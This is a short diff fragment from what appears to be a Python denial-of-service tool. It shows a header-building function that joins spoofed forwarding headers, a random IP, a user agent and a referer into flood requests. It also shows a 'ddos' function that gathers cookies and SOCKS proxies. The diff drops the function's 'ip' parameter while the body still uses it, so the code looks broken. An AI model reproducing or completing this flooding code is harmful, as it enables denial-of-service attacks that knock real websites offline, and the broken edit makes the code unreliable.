@@ -2503,7 +2503,7 @@ def Headerss(method):
         request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     return header
 
-def ddos(ip):
+def ddos():
     get_cookie(ip)
     socksCrawler()
     socksCrawlz()
